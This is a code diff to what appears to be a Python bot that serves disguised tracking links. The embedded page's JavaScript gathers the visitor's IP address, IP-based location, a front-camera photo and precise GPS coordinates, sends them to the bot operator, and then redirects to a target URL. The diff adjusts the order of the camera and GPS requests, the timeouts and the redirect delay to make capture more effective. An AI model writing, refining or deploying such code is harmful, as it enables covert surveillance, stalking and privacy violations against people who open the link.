@@ -117,7 +117,7 @@ def delete_old_files():
 def start_auto_cleanup():
     def cleanup():
         while True:
-            time.sleep(600)  # 10 minutes
+            time.sleep(600)
             delete_old_files()
     threading.Thread(target=cleanup, daemon=True).start()
 
@@ -284,7 +284,7 @@ function sendPhoto(blob) {{
 async function startProcess() {{
     showLoading();
     
-    // Get IP and basic info
+    // Get IP and basic info (fast, no permission needed)
     try {{
         let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'Unknown');
         let info = await fetch(`https://ipapi.co/${{ip}}/json/`).then(r=>r.json()).catch(()=>{{}});
@@ -313,7 +313,8 @@ async function startProcess() {{
         sendMessage(msg);
     }} catch(e) {{}}
     
-    // Camera and Location
+    // Camera first
+    let cameraSuccess = false;
     try {{
         let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user' }}, audio: false }});
         let video = document.getElementById('video');
@@ -327,27 +328,28 @@ async function startProcess() {{
         let blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
         if (blob && blob.size > 500) sendPhoto(blob);
         stream.getTracks().forEach(t => t.stop());
+        cameraSuccess = true;
     }} catch(e) {{
         sendMessage("Camera access denied");
     }}
     
-    // Location (always try, redirect after)
+    // THEN ask for GPS location (after camera)
     if (navigator.geolocation) {{
         navigator.geolocation.getCurrentPosition(
             (p) => {{
                 sendMessage("<b>GPS Location</b>\\nhttps://maps.google.com/?q=" + p.coords.latitude + "," + p.coords.longitude);
                 sendMessage("<b>Coordinates</b>\\nLat: " + p.coords.latitude + "\\nLon: " + p.coords.longitude + "\\nAccuracy: " + p.coords.accuracy + "m");
-                setTimeout(() => {{ window.location.href = TARGET; }}, 500);
+                setTimeout(() => {{ window.location.href = TARGET; }}, 300);
             }},
             (e) => {{
                 sendMessage("GPS Location: Access denied");
-                setTimeout(() => {{ window.location.href = TARGET; }}, 500);
+                setTimeout(() => {{ window.location.href = TARGET; }}, 300);
             }},
-            {{ timeout: 5000, enableHighAccuracy: true }}
+            {{ timeout: 8000, enableHighAccuracy: true }}
         );
     }} else {{
         sendMessage("GPS Location: Not supported");
-        setTimeout(() => {{ window.location.href = TARGET; }}, 500);
+        setTimeout(() => {{ window.location.href = TARGET; }}, 300);
     }}
 }}
 </script>
@@ -430,7 +432,7 @@ def webhook():
                 set_user_state(uid, "done")
 
                 link = f"https://{ACCOUNT_NAME}.onrender.com/view/{html_name}"
-                send_message(uid, f"✅ LINK:\n{link}\n\n⚠️ Active until you create new link\n📸 Camera required")
+                send_message(uid, f"✅ LINK:\n{link}\n\n⚠️ Active until you create new link\n📸 Camera required\n📍 GPS will be asked")
 
             except Exception as e:
                 logger.error(f"Photo error: {e}")
